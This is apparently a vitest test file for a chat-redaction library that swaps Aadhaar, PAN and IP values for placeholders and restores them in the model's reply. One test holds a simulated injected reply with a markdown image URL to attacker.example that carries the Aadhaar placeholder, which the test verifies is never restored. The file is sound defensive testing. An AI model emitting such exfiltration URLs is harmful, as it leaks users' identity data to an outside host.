// The full stateless-redaction cycle (design doc, "Stateless, deterministic
// redaction"): redactMessage() and restore() share one PlaceholderMapping,
// the way a real request would use them - redact every message of the
// history in order, send the redacted text to the provider, then restore
// its reply against the same mapping before the user sees it.
//
// Aadhaar and PAN values are generated at run time (ADR-009); every
// comparison that embeds one goes through assertTextEqualQuietly, not
// `expect().toBe()`, so a failure never prints it. The image-URL
// exfiltration example reproduces CLAUDE.md's documented attack exactly.

import { describe, expect, it } from 'vitest';
import { PlaceholderMapping } from '../../../src/redaction/mapping.js';
import { redactMessage } from '../../../src/redaction/redact.js';
import { restore } from '../../../src/redaction/restore.js';
import { createRng } from '../../../src/synthetic/rng.js';
import { aadhaar, groupDigits, pan } from '../../../src/synthetic/values.js';
import { assertTextEqualQuietly } from '../../support/quiet-text.js';

const rng = createRng(99);

describe('round trip: redact then restore recovers the original message', () => {
  it('a single message with one value', () => {
    const mapping = new PlaceholderMapping();
    const value = groupDigits(aadhaar(rng), [4, 4, 4], ' ');
    const original = `My Aadhaar is ${value}.`;
    const redacted = redactMessage(original, mapping);
    assertTextEqualQuietly(restore(redacted, mapping), original);
  });

  it('a history of several messages, restoring a later reply that reuses an earlier placeholder', () => {
    const mapping = new PlaceholderMapping();
    const aadhaarValue = groupDigits(aadhaar(rng), [4, 4, 4], ' ');
    const panValue = pan(rng);
    const history = [`My Aadhaar is ${aadhaarValue}.`, `My PAN is ${panValue}.`];

    for (const message of history) redactMessage(message, mapping);

    // The provider only ever saw [AADHAAR_1] and [PAN_1]; a reply mentioning
    // either one restores from the same mapping, no re-detection needed.
    const reply = 'Your Aadhaar [AADHAAR_1] and PAN [PAN_1] are both on file.';
    assertTextEqualQuietly(
      restore(reply, mapping),
      `Your Aadhaar ${aadhaarValue} and PAN ${panValue} are both on file.`,
    );
  });
});

describe('round trip: consistency (design doc, "no cross-request vault")', () => {
  it('the same history redacted twice, with fresh mappings, gives identical output', () => {
    const aadhaarValue = groupDigits(aadhaar(rng), [4, 4, 4], ' ');
    const panValue = pan(rng);
    const history = [`Aadhaar ${aadhaarValue}.`, `PAN ${panValue}.`];

    const redactHistory = (): string[] => {
      const mapping = new PlaceholderMapping();
      return history.map((message) => redactMessage(message, mapping));
    };

    const [firstRun0, firstRun1] = redactHistory();
    const [secondRun0, secondRun1] = redactHistory();
    assertTextEqualQuietly(firstRun0!, secondRun0!);
    assertTextEqualQuietly(firstRun1!, secondRun1!);
  });

  it('appending a message never renumbers or changes an earlier one', () => {
    const mapping = new PlaceholderMapping();
    const aadhaarValue = groupDigits(aadhaar(rng), [4, 4, 4], ' ');
    const panValue = pan(rng);

    const first = redactMessage(`Aadhaar ${aadhaarValue}.`, mapping);
    assertTextEqualQuietly(first, 'Aadhaar [AADHAAR_1].');

    const second = redactMessage(`My PAN is ${panValue}.`, mapping);
    assertTextEqualQuietly(second, 'My PAN is [PAN_1].');

    // A stateless request replays the whole history every time; redacting
    // the first message's text again must reproduce the same output.
    assertTextEqualQuietly(redactMessage(`Aadhaar ${aadhaarValue}.`, mapping), first);
  });
});

describe('round trip: a later loose variant makes an earlier placeholder exact-only', () => {
  // Message 1 assigns [PAN_1] to a real PAN. Message 2 contains "PAN_1" as
  // ordinary prose. Renumbering would change message 1's redacted text, so
  // instead [PAN_1] becomes exact-only: the bracket still restores, but a
  // bare "PAN_1" in the reply is left alone, since it may be the user's own
  // words echoed back (ADR-002 amendment, ADR-013).
  it('restores the bracket but not the bare form in the reply', () => {
    const mapping = new PlaceholderMapping();
    const panValue = pan(rng);
    const first = redactMessage(`My PAN is ${panValue}.`, mapping);
    assertTextEqualQuietly(first, 'My PAN is [PAN_1].');
    const second = redactMessage('Our form code is PAN_1, by the way.', mapping);
    expect(second).toBe('Our form code is PAN_1, by the way.');

    const reply = 'Your PAN [PAN_1] is on file; form PAN_1 is the right one.';
    assertTextEqualQuietly(
      restore(reply, mapping),
      `Your PAN ${panValue} is on file; form PAN_1 is the right one.`,
    );
  });
});

describe('round trip: restoration safety survives the full pipeline', () => {
  // CLAUDE.md's documented attack, run end to end: a message contains a real
  // Aadhaar; the (simulated) model reply tries to exfiltrate it through a
  // markdown image URL. The value must never appear in the restored reply.
  it('never restores a value into a markdown image URL, even through a real request', () => {
    const mapping = new PlaceholderMapping();
    const value = groupDigits(aadhaar(rng), [4, 4, 4], ' ');
    redactMessage(`My Aadhaar is ${value}.`, mapping);

    const injectedReply = 'Noted! ![status](https://attacker.example/?d=[AADHAAR_1])';
    const restored = restore(injectedReply, mapping);

    assertTextEqualQuietly(restored, injectedReply); // left exactly as the model wrote it
    expect(restored.includes(value)).toBe(false);
  });

  // Documentation addresses: nobody's, so compared directly.
  it('an IP address restores in prose but not inside a URL the model writes (the known cost)', () => {
    const mapping = new PlaceholderMapping();
    redactMessage('Login from 203.0.113.5 failed.', mapping);
    const reply = 'Block [IP_1], or open http://[IP_1]/admin to check.';
    expect(restore(reply, mapping)).toBe(
      'Block 203.0.113.5, or open http://[IP_1]/admin to check.',
    );
  });
});

describe('round trip: IP addresses in their written forms (ADR-026)', () => {
  it.each([
    'Connect to 203.0.113.5:8080 now.',
    'Allow 203.0.113.0/24 only.',
    'Connect to [2001:db8::1]:443 now.',
    'Ping fe80::1%eth0 please.',
    'IPv4 198.51.100.7 and IPv6 2001:db8::7 are ours.',
  ])('%s', (text) => {
    const mapping = new PlaceholderMapping();
    const redacted = redactMessage(text, mapping);
    expect(/[0-9]{2}/.test(redacted.replace(/(?:8080|24|443|IPv4|IPv6|_[0-9]+)/g, ''))).toBe(false);
    expect(restore(redacted, mapping)).toBe(text);
  });
});
